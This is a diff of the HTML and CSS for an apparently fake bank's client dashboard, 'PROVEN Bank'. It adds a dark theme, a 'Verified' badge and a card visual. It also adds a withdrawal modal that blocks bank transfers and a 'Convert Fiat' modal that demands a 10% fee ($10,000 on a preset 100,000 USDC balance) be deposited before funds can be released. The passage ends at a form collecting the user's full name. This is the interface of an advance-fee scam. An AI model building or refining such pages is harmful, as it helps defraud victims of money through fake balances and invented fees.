@@ -10,61 +10,211 @@
     <meta name="robots" content="noindex, nofollow">
     <style>
         *{box-sizing:border-box;margin:0;padding:0}
-        body{background:#f2f2f2;font-family:RNSSanz,sans-serif;color:#23282d;font-size:1.4rem}
-        .profile-header{background:linear-gradient(135deg,#23282d,#3a4249);color:#fff;padding:2rem;position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
-        .profile-header .greeting{font-size:1.6rem}
-        .profile-header .greeting strong{color:#ef4350}
+        body{background:#0d1117;font-family:RNSSanz,sans-serif;color:#e0e6f0;font-size:1.4rem}
+        .profile-header{background:rgba(13,17,23,.95);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,255,255,.08);color:#fff;padding:1.6rem 2.4rem;position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+        .profile-header .greeting{font-size:1.5rem;color:rgba(255,255,255,.7)}
+        .profile-header .greeting strong{color:#fff}
         .profile-header__left{display:flex;align-items:center;gap:1.5rem}
         .profile-logo{display:flex;align-items:center}
         .profile-logo img{height:2.4rem;width:auto;display:block}
-        .profile-header .logout{color:#fff;text-decoration:none;font-size:1.3rem;cursor:pointer;background:rgba(255,255,255,.1);padding:.5rem 1.2rem;border-radius:.4rem}
-        .profile-header .logout:hover{background:#ef4350}
-        .balance-card{background:#fff;border-radius:1rem;box-shadow:0 2px 15px rgba(0,0,0,.08);padding:2.5rem;margin-bottom:2rem;text-align:center}
-        .balance-card .label{font-size:1.3rem;color:#999;text-transform:uppercase;letter-spacing:.1em}
-        .balance-card .amount{font-size:4rem;font-weight:700;color:#23282d;margin:.5rem 0}
-        .balance-card .amount span{color:#ef4350}
-        .balance-card .account-info{font-size:1.3rem;color:#666;margin-top:.5rem}
-        .profile-layout{display:flex;min-height:calc(100vh - 7rem)}
-        .profile-sidebar{width:22rem;background:#fff;border-right:1px solid #ddd;padding:2rem 0;flex-shrink:0}
-        .profile-sidebar a{display:block;padding:1.2rem 2rem;color:#23282d;text-decoration:none;font-size:1.4rem;border-left:3px solid transparent;cursor:pointer}
-        .profile-sidebar a:hover,.profile-sidebar a.active{background:#f9f9f9;border-left-color:#ef4350;color:#ef4350}
-        .profile-main{flex:1;padding:2rem;overflow-x:auto}
-        .card{background:#fff;border-radius:.8rem;box-shadow:0 1px 6px rgba(0,0,0,.08);padding:2rem;margin-bottom:2rem}
-        .card h2{font-size:1.8rem;margin-bottom:1.5rem}
-        .card h3{font-size:1.5rem;margin-bottom:1rem}
+        .verified-badge{display:flex;align-items:center;gap:.5rem;color:#4ade80;font-size:1.3rem;font-weight:600}
+        .verified-badge svg{width:1.6rem;height:1.6rem}
+        .profile-header .logout{color:rgba(255,255,255,.6);text-decoration:none;font-size:1.3rem;cursor:pointer;background:rgba(255,255,255,.07);padding:.5rem 1.2rem;border-radius:.4rem;border:1px solid rgba(255,255,255,.1);transition:.2s}
+        .profile-header .logout:hover{background:rgba(239,67,80,.15);color:#ef4350;border-color:#ef4350}
+        .profile-header__right{display:flex;align-items:center;gap:1.6rem}
+        .profile-layout{display:flex;min-height:calc(100vh - 6.2rem)}
+        .profile-sidebar{width:20rem;background:#111820;border-right:1px solid rgba(255,255,255,.06);padding:2rem 0;flex-shrink:0}
+        .profile-sidebar a{display:block;padding:1.1rem 2rem;color:rgba(255,255,255,.5);text-decoration:none;font-size:1.4rem;border-left:3px solid transparent;cursor:pointer;transition:.2s}
+        .profile-sidebar a:hover,.profile-sidebar a.active{background:rgba(255,255,255,.04);border-left-color:#4f8ef7;color:#fff}
+        .profile-main{flex:1;overflow-x:auto;background:#0d1117}
+        /* Overview dark layout */
+        .ov-wrap{min-height:100%;background:#0d1117;position:relative}
+        .ov-hero{position:relative;overflow:hidden;padding:3rem 3rem 2rem;background:linear-gradient(135deg,#0f1923 0%,#1a2535 50%,#0f1923 100%)}
+        .ov-hero-bg{position:absolute;inset:0;background-image:url('/assets/img/home-pic.jpg');background-size:cover;background-position:center bottom;opacity:.18;pointer-events:none}
+        .ov-hero-content{position:relative;z-index:1}
+        .ov-hero-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:2.5rem}
+        .ov-welcome h1{font-size:2.4rem;font-weight:700;color:#fff;margin-bottom:.4rem}
+        .ov-welcome p{font-size:1.3rem;color:rgba(255,255,255,.5)}
+        .ov-verified{display:flex;align-items:center;gap:.5rem;color:#4ade80;font-size:1.3rem;font-weight:600;background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.25);padding:.5rem 1.2rem;border-radius:2rem}
+        .ov-verified svg{width:1.4rem;height:1.4rem}
+        .ov-body{display:grid;grid-template-columns:1fr 28rem;gap:2rem;position:relative;z-index:1}
+        .ov-left{display:flex;flex-direction:column;gap:2rem}
+        .ov-right{display:flex;flex-direction:column;gap:1.6rem}
+        /* Primary card panel */
+        .ov-card-panel{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:1.2rem;padding:2rem;display:flex;align-items:center;gap:2rem}
+        .ov-card-info{flex:1}
+        .ov-card-info .ov-card-label{font-size:1.2rem;color:rgba(255,255,255,.45);margin-bottom:.3rem;text-transform:uppercase;letter-spacing:.08em}
+        .ov-card-info .ov-card-sublabel{font-size:1.1rem;color:rgba(255,255,255,.3);margin-bottom:1.6rem}
+        .ov-card-info .ov-bal-label{font-size:1.1rem;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.08em;margin-bottom:.3rem}
+        .ov-card-info .ov-balance{font-size:3.2rem;font-weight:700;color:#fff;line-height:1;margin-bottom:.4rem}
+        .ov-card-info .ov-balance-currency{font-size:1.6rem;color:rgba(255,255,255,.5);margin-left:.4rem}
+        .ov-currency-wrap{display:flex;align-items:center;gap:.8rem;margin-top:.8rem}
+        .ov-currency-wrap select{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);color:#fff;font-size:1.2rem;padding:.4rem .8rem;border-radius:.4rem;cursor:pointer;font-family:inherit}
+        .ov-currency-wrap select:focus{outline:none;border-color:#4f8ef7}
+        .ov-currency-wrap option{background:#1a2535;color:#fff}
+        .ov-rate-info{font-size:1.1rem;color:rgba(255,255,255,.35)}
+        /* Credit card visual */
+        .ov-card-visual{width:22rem;flex-shrink:0;position:relative}
+        .credit-card{width:22rem;height:13.8rem;border-radius:1.2rem;background:linear-gradient(135deg,#1e2d4a 0%,#2d3f6e 40%,#3d2d6e 100%);position:relative;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.5);cursor:default}
+        .credit-card::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.08) 0%,transparent 60%);pointer-events:none}
+        .credit-card-shine{position:absolute;top:-2rem;right:-2rem;width:12rem;height:12rem;border-radius:50%;background:radial-gradient(circle,rgba(120,140,255,.15) 0%,transparent 70%)}
+        .credit-card-top{position:absolute;top:1.2rem;left:1.4rem;right:1.4rem;display:flex;align-items:center;justify-content:space-between}
+        .credit-card-bank{font-size:1rem;font-weight:700;color:rgba(255,255,255,.9);letter-spacing:.05em}
+        .credit-card-type{font-size:.85rem;color:rgba(255,255,255,.5);text-align:right}
+        .credit-card-chip{position:absolute;top:3.8rem;left:1.4rem;width:3rem;height:2.2rem;background:linear-gradient(135deg,#c8a96e,#e8c98e,#c8a96e);border-radius:.3rem;overflow:hidden}
+        .credit-card-chip::after{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:rgba(0,0,0,.3);transform:translateY(-50%)}
+        .credit-card-nfc{position:absolute;top:3.8rem;right:1.4rem;color:rgba(255,255,255,.4);font-size:1.6rem}
+        .credit-card-number{position:absolute;bottom:3.6rem;left:1.4rem;font-size:1.1rem;color:rgba(255,255,255,.7);letter-spacing:.18em;font-family:monospace}
+        .credit-card-footer{position:absolute;bottom:1rem;left:1.4rem;right:1.4rem;display:flex;align-items:flex-end;justify-content:space-between}
+        .credit-card-holder-label,.credit-card-exp-label,.credit-card-cvv-label{font-size:.7rem;color:rgba(255,255,255,.35);text-transform:uppercase;margin-bottom:.15rem}
+        .credit-card-holder-name,.credit-card-exp,.credit-card-cvv{font-size:.95rem;color:rgba(255,255,255,.85);font-weight:600;letter-spacing:.04em}
+        .credit-card-meta{display:flex;gap:1.6rem}
+        .credit-card-brand{font-size:2rem;font-style:italic;font-weight:700;color:rgba(255,255,255,.9);letter-spacing:-.02em}
+        /* Transactions */
+        .ov-txn-panel{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:1.2rem;padding:2rem}
+        .ov-txn-tabs{display:flex;align-items:center;gap:1rem;margin-bottom:1.6rem;flex-wrap:wrap}
+        .ov-txn-tabs .ov-txn-title{font-size:1.5rem;font-weight:700;color:#fff;flex:1}
+        .ov-tab-btn{padding:.5rem 1.2rem;border-radius:.5rem;font-size:1.2rem;font-weight:600;cursor:pointer;border:1px solid rgba(255,255,255,.15);background:transparent;color:rgba(255,255,255,.5);transition:.2s;font-family:inherit}
+        .ov-tab-btn.active{background:#4f8ef7;border-color:#4f8ef7;color:#fff}
+        .ov-tab-btn:hover:not(.active){background:rgba(255,255,255,.07);color:#fff}
+        .ov-txn-list{display:flex;flex-direction:column;gap:.8rem}
+        .ov-txn-item{display:flex;align-items:center;gap:1.2rem;padding:.8rem 0;border-bottom:1px solid rgba(255,255,255,.05)}
+        .ov-txn-item:last-child{border-bottom:0}
+        .ov-txn-icon{width:3.2rem;height:3.2rem;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .ov-txn-icon.credit{background:rgba(74,222,128,.15);color:#4ade80}
+        .ov-txn-icon.debit{background:rgba(239,68,68,.15);color:#f87171}
+        .ov-txn-icon svg{width:1.5rem;height:1.5rem}
+        .ov-txn-info{flex:1}
+        .ov-txn-info .ov-txn-name{font-size:1.3rem;color:#e0e6f0;font-weight:600}
+        .ov-txn-info .ov-txn-date{font-size:1.1rem;color:rgba(255,255,255,.35);margin-top:.15rem}
+        .ov-txn-amount{font-size:1.4rem;font-weight:700}
+        .ov-txn-amount.credit{color:#4ade80}
+        .ov-txn-amount.debit{color:#f87171}
+        .ov-empty{text-align:center;padding:2.5rem 1rem;color:rgba(255,255,255,.3);font-size:1.3rem}
+        /* Quick actions */
+        .ov-quick-title{font-size:1.1rem;font-weight:700;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.1em;margin-bottom:1rem}
+        .ov-action-btn{display:flex;align-items:center;gap:1rem;width:100%;padding:1.1rem 1.4rem;background:transparent;border:1px solid rgba(255,255,255,.12);border-radius:.8rem;color:#e0e6f0;font-size:1.4rem;font-weight:600;cursor:pointer;transition:.2s;font-family:inherit;margin-bottom:.8rem;text-align:left}
+        .ov-action-btn:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.25);color:#fff}
+        .ov-action-btn:last-child{margin-bottom:0}
+        .ov-action-icon{width:2.6rem;height:2.6rem;border-radius:.5rem;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,.08);flex-shrink:0}
+        .ov-action-icon svg{width:1.4rem;height:1.4rem}
+        /* Premium plan */
+        .ov-premium{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:1.2rem;padding:1.8rem}
+        .ov-premium h3{font-size:1.4rem;font-weight:700;color:#fff;margin-bottom:.6rem}
+        .ov-premium p{font-size:1.2rem;color:rgba(255,255,255,.4);margin-bottom:1.4rem;line-height:1.6}
+        .ov-premium-btn{display:block;width:100%;padding:1rem;background:#4f8ef7;border:none;border-radius:.6rem;color:#fff;font-size:1.3rem;font-weight:700;cursor:pointer;transition:.2s;font-family:inherit;text-align:center}
+        .ov-premium-btn:hover{background:#3a7de0}
+        /* Withdrawal modal */
+        .wd-modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:1000;display:flex;align-items:center;justify-content:center;padding:2rem;backdrop-filter:blur(4px)}
+        .wd-modal{background:#1a2230;border:1px solid rgba(255,255,255,.08);border-radius:1.4rem;width:100%;max-width:38rem;padding:3rem 2.6rem 2.4rem;position:relative;text-align:center;box-shadow:0 24px 80px rgba(0,0,0,.6)}
+        .wd-modal-close{position:absolute;top:1.2rem;right:1.2rem;width:2.4rem;height:2.4rem;border-radius:50%;background:#e53e3e;border:none;cursor:pointer;color:#fff;font-size:1.4rem;font-weight:700;line-height:1;display:flex;align-items:center;justify-content:center}
+        .wd-modal-close:hover{background:#c53030}
+        .wd-modal-icon{width:6rem;height:6rem;border-radius:50%;background:rgba(237,137,54,.15);border:3px solid rgba(237,137,54,.3);display:flex;align-items:center;justify-content:center;margin:0 auto 1.8rem}
+        .wd-modal-icon span{font-size:2.8rem;font-weight:900;color:#ed8936;line-height:1}
+        .wd-modal h2{font-size:1.8rem;font-weight:800;color:#fff;margin-bottom:.6rem}
+        .wd-modal .wd-modal-sub{font-size:1.3rem;color:#ed8936;font-weight:600;margin-bottom:2rem}
+        .wd-modal-list{text-align:left;display:flex;flex-direction:column;gap:1rem;margin-bottom:2.4rem}
+        .wd-modal-list-item{display:flex;align-items:flex-start;gap:1rem;background:rgba(237,137,54,.07);border:1px solid rgba(237,137,54,.15);border-radius:.8rem;padding:1rem 1.2rem}
+        .wd-modal-list-num{width:2.2rem;height:2.2rem;border-radius:50%;background:#ed8936;color:#fff;font-size:1.1rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:.05rem}
+        .wd-modal-list-text{font-size:1.2rem;color:rgba(255,255,255,.75);line-height:1.5}
+        .wd-modal-convert{display:block;width:100%;padding:1.2rem;background:linear-gradient(90deg,#d97706,#f59e0b);border:none;border-radius:.8rem;color:#fff;font-size:1.4rem;font-weight:800;cursor:pointer;font-family:inherit;margin-bottom:1rem;transition:.2s;letter-spacing:.02em}
+        .wd-modal-convert:hover{background:linear-gradient(90deg,#b45309,#d97706)}
+        .wd-modal-cancel{background:none;border:none;color:rgba(255,255,255,.4);font-size:1.3rem;cursor:pointer;font-family:inherit;transition:.2s}
+        .wd-modal-cancel:hover{color:#fff}
+        /* Convert Fiat modal */
+        .cf-modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:1100;display:flex;align-items:center;justify-content:center;padding:2rem;backdrop-filter:blur(6px)}
+        .cf-modal{background:linear-gradient(160deg,#1a2a6c 0%,#1e3a8a 60%,#1e40af 100%);border:1px solid rgba(255,255,255,.12);border-radius:1.4rem;width:100%;max-width:40rem;padding:0;overflow:hidden;max-height:90vh;display:flex;flex-direction:column;box-shadow:0 32px 100px rgba(0,0,0,.7)}
+        .cf-modal-body{padding:2rem;overflow-y:auto;flex:1}
+        .cf-modal-header{display:flex;align-items:center;gap:1rem;padding:1.8rem 2rem 1.4rem;border-bottom:1px solid rgba(255,255,255,.08)}
+        .cf-modal-back{background:none;border:none;color:rgba(255,255,255,.7);cursor:pointer;padding:.2rem;display:flex;align-items:center;font-size:1.8rem;line-height:1;transition:.2s}
+        .cf-modal-back:hover{color:#fff}
+        .cf-modal-header h2{font-size:1.6rem;font-weight:700;color:#fff;margin:0}
+        .cf-section-label{font-size:1rem;font-weight:700;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.6rem}
+        .cf-balance-row{display:flex;align-items:center;justify-content:space-between;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);border-radius:.8rem;padding:1.2rem 1.4rem;margin-bottom:1.6rem}
+        .cf-balance-amount{font-size:2rem;font-weight:800;color:#fff}
+        .cf-balance-badge{background:#3b82f6;color:#fff;font-size:1.1rem;font-weight:700;padding:.35rem .9rem;border-radius:2rem;letter-spacing:.04em}
+        .cf-select-wrap{position:relative;margin-bottom:.8rem}
+        .cf-select-wrap select{width:100%;padding:1.1rem 1.4rem;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.15);border-radius:.8rem;color:#fff;font-size:1.4rem;font-family:inherit;cursor:pointer;appearance:none;-webkit-appearance:none}
+        .cf-select-wrap select:focus{outline:none;border-color:rgba(255,255,255,.4)}
+        .cf-select-wrap select option{background:#1e3a8a;color:#fff}
+        .cf-select-arrow{position:absolute;right:1.2rem;top:50%;transform:translateY(-50%);pointer-events:none;color:rgba(255,255,255,.5);font-size:1.2rem}
+        .cf-rate-line{font-size:1.2rem;color:rgba(255,255,255,.5);margin-bottom:1.4rem;padding-left:.2rem}
+        .cf-fee-row{display:flex;align-items:center;justify-content:space-between;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:.8rem;padding:1rem 1.4rem;margin-bottom:1.6rem}
+        .cf-fee-label{font-size:1.3rem;color:rgba(255,255,255,.6)}
+        .cf-fee-pct{font-size:1.4rem;font-weight:700;color:#fff}
+        .cf-total-box{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);border-radius:.8rem;padding:1.4rem 1.6rem;margin-bottom:1.4rem}
+        .cf-total-box .cf-section-label{margin-bottom:.5rem}
+        .cf-total-amount{font-size:2.6rem;font-weight:900;color:#fff;margin-bottom:.3rem}
+        .cf-total-sub{font-size:1.2rem;color:rgba(255,255,255,.45)}
+        .cf-notice{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:.8rem;padding:1.1rem 1.3rem;margin-bottom:1.6rem}
+        .cf-notice p{font-size:1.15rem;color:rgba(255,255,255,.45);line-height:1.6}
+        .cf-form-row{margin-bottom:1.1rem}
+        .cf-form-row label{display:block;font-size:1.1rem;font-weight:600;color:rgba(255,255,255,.5);margin-bottom:.4rem;text-transform:uppercase;letter-spacing:.06em}
+        .cf-form-row input{width:100%;padding:.9rem 1.1rem;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.15);border-radius:.6rem;color:#fff;font-size:1.3rem;font-family:inherit}
+        .cf-form-row input::placeholder{color:rgba(255,255,255,.25)}
+        .cf-form-row input:focus{outline:none;border-color:rgba(255,255,255,.4)}
+        .cf-form-half{display:flex;gap:1rem}
+        .cf-form-half .cf-form-row{flex:1}
+        .cf-submit{display:block;width:100%;padding:1.3rem;background:#fff;border:none;border-radius:.8rem;color:#1e3a8a;font-size:1.5rem;font-weight:800;cursor:pointer;font-family:inherit;margin-bottom:1rem;transition:.2s;letter-spacing:.02em}
+        .cf-submit:hover{background:rgba(255,255,255,.88)}
+        .cf-cancel{background:none;border:none;color:rgba(255,255,255,.45);font-size:1.3rem;cursor:pointer;font-family:inherit;width:100%;transition:.2s}
+        .cf-cancel:hover{color:#fff}
+        /* Insufficient balance screen */
+        .cf-insuf{display:none;padding:2.4rem 2rem 2rem;text-align:center;flex-direction:column;align-items:center}
+        .cf-insuf.active{display:flex}
+        .cf-insuf-icon{width:7rem;height:7rem;border-radius:50%;background:rgba(239,68,68,.15);border:3px solid rgba(239,68,68,.35);display:flex;align-items:center;justify-content:center;margin:0 auto 2rem}
+        .cf-insuf-icon svg{width:3rem;height:3rem;color:#ef4444}
+        .cf-insuf h2{font-size:1.8rem;font-weight:800;color:#fff;margin-bottom:.8rem}
+        .cf-insuf p{font-size:1.3rem;color:rgba(255,255,255,.55);line-height:1.6;margin-bottom:2rem;max-width:28rem}
+        .cf-insuf-rows{width:100%;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:.8rem;overflow:hidden;margin-bottom:2.4rem}
+        .cf-insuf-row{display:flex;justify-content:space-between;align-items:center;padding:1.1rem 1.4rem;border-bottom:1px solid rgba(255,255,255,.07)}
+        .cf-insuf-row:last-child{border-bottom:none}
+        .cf-insuf-row-label{font-size:1.05rem;font-weight:700;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.08em}
+        .cf-insuf-row-val{font-size:1.4rem;font-weight:700;color:#fff}
+        .cf-insuf-hint{font-size:1.2rem;color:rgba(255,255,255,.35);margin-bottom:1.6rem}
+        .cf-insuf-support{display:block;width:100%;padding:1.3rem;background:#fff;border:none;border-radius:.8rem;color:#1e3a8a;font-size:1.5rem;font-weight:800;cursor:pointer;font-family:inherit;margin-bottom:1rem;transition:.2s}
+        .cf-insuf-support:hover{background:rgba(255,255,255,.88)}
+        .cf-insuf-back{background:none;border:none;color:rgba(255,255,255,.45);font-size:1.3rem;cursor:pointer;font-family:inherit;transition:.2s}
+        .cf-insuf-back:hover{color:#fff}
+        /* Non-overview sections */
+        .card{background:#1a2535;border:1px solid rgba(255,255,255,.08);border-radius:.8rem;box-shadow:none;padding:2rem;margin-bottom:2rem}
+        .card h2{font-size:1.8rem;margin-bottom:1.5rem;color:#fff}
+        .card h3{font-size:1.5rem;margin-bottom:1rem;color:#e0e6f0}
         table{width:100%;border-collapse:collapse;font-size:1.3rem}
-        table th{text-align:left;padding:1rem 1.2rem;border-bottom:2px solid #eee;color:#666;font-weight:600;text-transform:uppercase;font-size:1.1rem;white-space:nowrap}
-        table td{padding:1rem 1.2rem;border-bottom:1px solid #f5f5f5;vertical-align:middle}
+        table th{text-align:left;padding:1rem 1.2rem;border-bottom:1px solid rgba(255,255,255,.08);color:rgba(255,255,255,.4);font-weight:600;text-transform:uppercase;font-size:1.1rem;white-space:nowrap}
+        table td{padding:1rem 1.2rem;border-bottom:1px solid rgba(255,255,255,.05);vertical-align:middle;color:#e0e6f0}
         .badge{display:inline-block;padding:.3rem .8rem;border-radius:1rem;font-size:1.1rem;font-weight:600}
-        .badge-completed{background:#d4edda;color:#155724}
-        .badge-pending{background:#fff3cd;color:#856404}
-        .btn{display:inline-block;padding:.6rem 1.4rem;font-size:1.2rem;font-weight:600;border:1px solid #ef4350;color:#ef4350;background:0 0;cursor:pointer;border-radius:.4rem;transition:.3s;text-decoration:none;font-family:RNSSanz,sans-serif}
-        .btn:hover{background:#ef4350;color:#fff}
-        .btn-black{background:#23282d;color:#fff;border-color:#23282d}
-        .btn-black:hover{background:#000}
+        .badge-completed{background:rgba(74,222,128,.15);color:#4ade80}
+        .badge-pending{background:rgba(251,191,36,.15);color:#fbbf24}
+        .btn{display:inline-block;padding:.6rem 1.4rem;font-size:1.2rem;font-weight:600;border:1px solid rgba(255,255,255,.2);color:#e0e6f0;background:transparent;cursor:pointer;border-radius:.4rem;transition:.3s;text-decoration:none;font-family:RNSSanz,sans-serif}
+        .btn:hover{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.35);color:#fff}
+        .btn-black{background:#4f8ef7;color:#fff;border-color:#4f8ef7}
+        .btn-black:hover{background:#3a7de0;border-color:#3a7de0}
         .form-row{margin-bottom:1.5rem}
-        .form-row label{display:block;font-weight:600;margin-bottom:.4rem;font-size:1.3rem}
-        .form-row input,.form-row select,.form-row textarea{width:100%;padding:1rem;border:1px solid #ddd;border-radius:.4rem;font-size:1.4rem;font-family:RNSSanz,sans-serif;background:#fff}
-        .form-row input:focus,.form-row select:focus,.form-row textarea:focus{outline:0;border-color:#ef4350}
+        .form-row label{display:block;font-weight:600;margin-bottom:.4rem;font-size:1.3rem;color:rgba(255,255,255,.6)}
+        .form-row input,.form-row select,.form-row textarea{width:100%;padding:1rem;border:1px solid rgba(255,255,255,.1);border-radius:.4rem;font-size:1.4rem;font-family:RNSSanz,sans-serif;background:rgba(255,255,255,.05);color:#fff}
+        .form-row input:focus,.form-row select:focus,.form-row textarea:focus{outline:0;border-color:#4f8ef7}
+        .form-row input::placeholder,.form-row textarea::placeholder{color:rgba(255,255,255,.25)}
+        .form-row select option{background:#1a2535;color:#fff}
         .form-row.half{display:flex;gap:1.5rem}
         .form-row.half > div{flex:1}
         .toast{position:fixed;top:2rem;right:2rem;padding:1.2rem 2rem;border-radius:.6rem;color:#fff;font-weight:600;z-index:2000;animation:slideIn .3s;max-width:40rem}
-        .toast-success{background:#28a745}
-        .toast-error{background:#dc3545}
+        .toast-success{background:#166534;border:1px solid #4ade80}
+        .toast-error{background:#7f1d1d;border:1px solid #f87171}
         @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
-        .empty-state{text-align:center;padding:3rem 2rem;color:#999;font-size:1.4rem}
-        .msg-item{padding:1rem 0;border-bottom:1px solid #f0f0f0}
+        .empty-state{text-align:center;padding:3rem 2rem;color:rgba(255,255,255,.3);font-size:1.4rem}
+        .msg-item{padding:1rem 0;border-bottom:1px solid rgba(255,255,255,.06)}
         .msg-item:last-child{border-bottom:0}
-        .msg-item .msg-subject{font-weight:600;margin-bottom:.3rem}
-        .msg-item .msg-body{color:#666;margin-bottom:.3rem}
-        .msg-item .msg-date{font-size:1.1rem;color:#999}
-        .deposit-note{background:#fff3cd;color:#856404;padding:1.5rem;border-radius:.6rem;margin-bottom:2rem;font-size:1.3rem}
+        .msg-item .msg-subject{font-weight:600;margin-bottom:.3rem;color:#fff}
+        .msg-item .msg-body{color:rgba(255,255,255,.5);margin-bottom:.3rem}
+        .msg-item .msg-date{font-size:1.1rem;color:rgba(255,255,255,.3)}
+        .deposit-note{background:rgba(251,191,36,.08);color:#fbbf24;border:1px solid rgba(251,191,36,.2);padding:1.5rem;border-radius:.6rem;margin-bottom:2rem;font-size:1.3rem}
         .hidden{display:none}
-        .currency-selector{margin:.8rem 0}
-        .currency-selector select{font-size:1.3rem;padding:.4rem .8rem;border:1px solid #ddd;border-radius:.4rem;background:#fff;font-family:RNSSanz,sans-serif;cursor:pointer;color:#555}
-        .currency-selector select:focus{outline:0;border-color:#ef4350}
-        .balance-card .amount .currency-symbol{font-size:2.5rem;vertical-align:super;margin-right:.2rem;color:#ef4350}
-        .rate-info{font-size:1.1rem;color:#999;margin-top:.3rem}
+        .balance-card{display:none}
+        .rate-info{font-size:1.1rem;color:rgba(255,255,255,.3);margin-top:.3rem}
+        .non-ov-wrap{padding:2rem}
+        @media(max-width:900px){.ov-body{grid-template-columns:1fr}.ov-right{order:1}.ov-left{order:2}.ov-card-visual{width:100%;display:flex;justify-content:center}.credit-card{width:100%;max-width:24rem;height:15rem}.ov-card-panel{flex-direction:column;align-items:flex-start}}
+        @media(max-width:640px){.ov-hero{padding:2rem 1.4rem 1.4rem}.ov-welcome h1{font-size:1.8rem}.ov-balance{font-size:2.4rem!important}}
     </style>
 
 <link rel="stylesheet" href="/assets/css/custom.css"></head>
@@ -74,7 +224,10 @@
             <a class="profile-logo" href="/"><img src="/assets/img/favicon-32x32.png" alt="PROVEN Bank"></a>
             <div class="greeting">Welcome, <strong id="client-name">Client</strong></div>
         </div>
-        <a class="logout" onclick="logout()">Sign Out</a>
+        <div class="profile-header__right">
+            <div class="verified-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg> Verified</div>
+            <a class="logout" onclick="logout()">Sign Out</a>
+        </div>
     </div>
     <div class="profile-layout">
         <nav class="profile-sidebar">
@@ -87,6 +240,83 @@
         <main class="profile-main" id="main-content"></main>
     </div>
     <div id="toast-container"></div>
+    <div class="wd-modal-overlay" id="wd-modal-overlay" style="display:none" onclick="if(event.target===this)closeWithdrawModal()">
+        <div class="wd-modal">
+            <button class="wd-modal-close" onclick="closeWithdrawModal()">&#x2715;</button>
+            <div class="wd-modal-icon"><span>!</span></div>
+            <h2>Bank Transfer Not Supported</h2>
+            <div class="wd-modal-sub">Your funds are held in USDC (crypto currency)</div>
+            <div class="wd-modal-list">
+                <div class="wd-modal-list-item"><div class="wd-modal-list-num">1</div><div class="wd-modal-list-text">Traditional banks do not accept direct USDC or crypto transfers.</div></div>
+                <div class="wd-modal-list-item"><div class="wd-modal-list-num">2</div><div class="wd-modal-list-text">You must convert your USDC to fiat currency (USD, EUR, AED, etc.) before initiating a bank transfer.</div></div>
+                <div class="wd-modal-list-item"><div class="wd-modal-list-num">3</div><div class="wd-modal-list-text">Contact support via chat to process your conversion and proceed with the transfer.</div></div>
+            </div>
+            <button class="wd-modal-convert" onclick="closeWithdrawModal();openConvertModal()">Convert</button>
+            <button class="wd-modal-cancel" onclick="closeWithdrawModal()">Cancel</button>
+        </div>
+    </div>
+    <div class="cf-modal-overlay" id="cf-modal-overlay" style="display:none" onclick="if(event.target===this)closeConvertModal()">
+        <div class="cf-modal">
+            <div class="cf-modal-header">
+                <button class="cf-modal-back" onclick="closeConvertModal();openWithdrawModal()">&#8592;</button>
+                <h2>Convert Fiat</h2>
+            </div>
+            <div class="cf-modal-body">
+                <div class="cf-section-label">Crypto Balance</div>
+                <div class="cf-balance-row">
+                    <div class="cf-balance-amount" id="cf-balance-display">100,000.00</div>
+                    <div class="cf-balance-badge">USDC</div>
+                </div>
+                <div class="cf-section-label">Select Fiat Currency</div>
+                <div class="cf-select-wrap">
+                    <select id="cf-currency" onchange="cfUpdateCalc()">
+                        <option value="usd">🇺🇸 USD &nbsp; US Dollar</option>
+                        <option value="eur">🇪🇺 EUR &nbsp; Euro</option>
+                        <option value="cad">🇨🇦 CAD &nbsp; Canadian Dollar</option>
+                        <option value="chf">🇨🇭 CHF &nbsp; Swiss Franc</option>
+                        <option value="aed">🇦🇪 AED &nbsp; UAE Dirham</option>
+                    </select>
+                    <span class="cf-select-arrow">&#9660;</span>
+                </div>
+                <div class="cf-rate-line" id="cf-rate-line">1 USDC = 1.0000 USD</div>
+                <div class="cf-fee-row">
+                    <span class="cf-fee-label">Conversion Fee</span>
+                    <span class="cf-fee-pct">10.00%</span>
+                </div>
+                <div class="cf-total-box">
+                    <div class="cf-section-label">Total Fees Needed for Conversion</div>
+                    <div class="cf-total-amount" id="cf-total-amount">$10,000.00</div>
+                    <div class="cf-total-sub" id="cf-total-sub">Deposit this amount to your bank account</div>
+                </div>
+                <div class="cf-notice">
+                    <p>Notice: Due to current regulations, crypto withdrawals and partial conversions are not supported. Any conversion fees are the customer's responsibility.</p>
+                </div>
+                <div class="cf-form-row"><label>Full Name</label><input type="text" id="cf-full_name" placeholder="Full name"></div>
